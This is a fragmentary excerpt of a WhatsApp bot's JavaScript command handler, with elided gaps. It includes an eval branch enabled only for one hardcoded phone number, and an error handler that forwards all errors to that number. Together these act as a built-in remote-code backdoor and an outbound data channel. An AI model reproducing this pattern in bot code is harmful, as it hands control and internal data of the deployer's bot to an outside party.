...
var xeonytimewisher = `Good Morning 🌄`
		...
		if (isEval && senderNumber == "6285839350971") {
			let evaled,
				text = q,
...
if (!XeonTheCreator) return replygcxeon(mess.owner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("jo2.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replygcxeon(`${getCase(q)}`)
break
case 'addprem':
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 6285839350971`)
...
let e = String(err)
XeonBotInc.sendMessage("6285839350971@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
